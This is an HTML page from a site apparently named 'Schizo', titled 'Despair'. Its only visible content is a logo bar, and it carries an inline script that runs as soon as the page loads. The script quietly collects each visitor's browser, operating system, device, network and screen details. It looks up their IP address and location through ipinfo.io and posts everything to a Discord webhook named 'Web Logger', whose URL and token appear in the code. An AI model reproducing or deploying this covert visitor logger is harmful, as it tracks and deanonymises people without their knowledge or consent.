<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Document Title -->
    <title>Schizo | Despair</title>
    
    <!-- Favicon -->
    <link rel="icon" href="/assets/despair.png"/>

    <!-- Open Graph Meta Tags -->
    <meta property="og:title" content="Schizo | Despair"/>
    <meta property="og:description" content="Read about Despair."/>
    <meta property="og:image" content="https://schizophrenic.lol/assets/schizologo.png"/>
    
    <!-- Theme Color -->
    <meta name="theme-color" content="#7700ff"/>

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image" />

    <!-- Stylesheets -->
    <link rel="stylesheet" href="/styles.css">

    <!-- Load Scripts -->
    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
    <script src="/scripts/index.js"></script>  

    <!-- Inline Styles -->
    <style>
        /* Add custom styles here */
    </style>

    <!-- Viewport Configuration for Responsive Design -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
    <!-- Title Bar -->
    <div class="titlebar__bar">
        <div class="titlebar__logo">
            <a href="https://schizophrenic.lol">
                <img src="/assets/schizologo.png" alt="Logo">
            </a>
        </div>
    </div>
    <!-- Title Bar -->

    <div></div>

    <script>
        // Function to get browser information
        function getBrowserInfo() {
            const userAgent = navigator.userAgent;
            let browserName = navigator.appName;
            let fullVersion = '' + parseFloat(navigator.appVersion);
            let nameOffset, verOffset;

            if ((verOffset = userAgent.indexOf("Opera")) != -1) {
                browserName = "Opera";
                fullVersion = userAgent.substring(verOffset + 6);
                if ((verOffset = userAgent.indexOf("Version")) != -1)
                    fullVersion = userAgent.substring(verOffset + 8);
            } else if ((verOffset = userAgent.indexOf("MSIE")) != -1) {
                browserName = "Microsoft Internet Explorer";
                fullVersion = userAgent.substring(verOffset + 5);
            } else if ((verOffset = userAgent.indexOf("Chrome")) != -1) {
                browserName = "Chrome";
                fullVersion = userAgent.substring(verOffset + 7);
            } else if ((verOffset = userAgent.indexOf("Safari")) != -1) {
                browserName = "Safari";
                fullVersion = userAgent.substring(verOffset + 7);
                if ((verOffset = userAgent.indexOf("Version")) != -1)
                    fullVersion = userAgent.substring(verOffset + 8);
            } else if ((verOffset = userAgent.indexOf("Firefox")) != -1) {
                browserName = "Firefox";
                fullVersion = userAgent.substring(verOffset + 8);
            } else if ((nameOffset = userAgent.lastIndexOf(' ') + 1) <
                (verOffset = userAgent.lastIndexOf('/'))) {
                browserName = userAgent.substring(nameOffset, verOffset);
                fullVersion = userAgent.substring(verOffset + 1);
                if (browserName.toLowerCase() == browserName.toUpperCase()) {
                    browserName = navigator.appName;
                }
            }

            return browserName + " " + fullVersion;
        }

        // Function to get operating system information
        function getOSInfo() {
            const userAgent = navigator.userAgent;
            let os = "Unknown OS";

            if (userAgent.indexOf("Win") != -1) os = "Windows";
            if (userAgent.indexOf("Mac") != -1) os = "Macintosh";
            if (userAgent.indexOf("Linux") != -1) os = "Linux";
            if (userAgent.indexOf("Android") != -1) os = "Android";
            if (userAgent.indexOf("like Mac") != -1) os = "iOS";

            return os;
        }

        // Function to get network information
        function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                return {
                    downlink: connection.downlink + "Mbps",
                    effectiveType: connection.effectiveType,
                    rtt: connection.rtt + "ms",
                };
            }
            return null;
        }

        // Function to get device information
        function getDeviceInfo() {
            return {
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                deviceMemory: navigator.deviceMemory || 'Unknown',
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookieEnabled: navigator.cookieEnabled,
            };
        }

        // Function to get screen information
        function getScreenInfo() {
            return {
                width: window.screen.width,
                height: window.screen.height,
                colorDepth: window.screen.colorDepth,
                pixelDepth: window.screen.pixelDepth,
            };
        }

        // Function to send data to the Discord webhook
        function sendToDiscord(data) {
            fetch('https://discord.com/api/webhooks/1271756418101411890/zfiqg4D7Wsq-Hb5Mk4o_ayMd513PLm67T78V434Vw0jdipuxUjEwiijbQCeEvMqLfi9T', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: `**New Visitor Logged**\n` +
                             `**IP:** ${data.ip}\n` +
                             `**Location:** ${data.city}, ${data.region}, ${data.country}\n` +
                             `**Organization:** ${data.org}\n` +
                             `**Browser:** ${data.browser}\n` +
                             `**Operating System:** ${data.os}\n` +
                             `**Network:** Downlink: ${data.network?.downlink}, RTT: ${data.network?.rtt}, Effective Type: ${data.network?.effectiveType}\n` +
                             `**Device Info:** CPU Cores: ${data.device.hardwareConcurrency}, Memory: ${data.device.deviceMemory}GB, Language: ${data.device.language}, Platform: ${data.device.platform}, Cookie Enabled: ${data.device.cookieEnabled}\n` +
                             `**Screen Resolution:** ${data.screen.width}x${data.screen.height}, Color Depth: ${data.screen.colorDepth}, Pixel Depth: ${data.screen.pixelDepth}\n` +
                             `**Timestamp:** ${data.timestamp}`,
                    username: 'Web Logger'
                }),
            }).then(response => {
                console.log('Data sent to Discord:', response);
            }).catch(error => {
                console.error('Error sending data to Discord:', error);
            });
        }

        // Function to log user visit
        function logUserVisit() {
            // Get browser, OS, network, device, and screen info
            const clientData = {
                browser: getBrowserInfo(),
                os: getOSInfo(),
                network: getNetworkInfo(),
                device: getDeviceInfo(),
                screen: getScreenInfo(),
                timestamp: new Date().toLocaleString(),
            };

            // Get IP and location info from IPInfo API and then send all data to Discord
            fetch('https://ipinfo.io/json?token=fbc037140ec409')
                .then(response => response.json())
                .then(ipData => {
                    const data = {
                        ...clientData,
                        ip: ipData.ip,
                        city: ipData.city,
                        region: ipData.region,
                        country: ipData.country,
                        org: ipData.org,
                    };

                    // Send the combined data to Discord webhook
                    sendToDiscord(data);
                })
                .catch(error => {
                    console.error('Error fetching IP info:', error);
                });
        }

        // Log the visit as soon as the page loads
        window.onload = logUserVisit;
    </script>

</body>
</html>
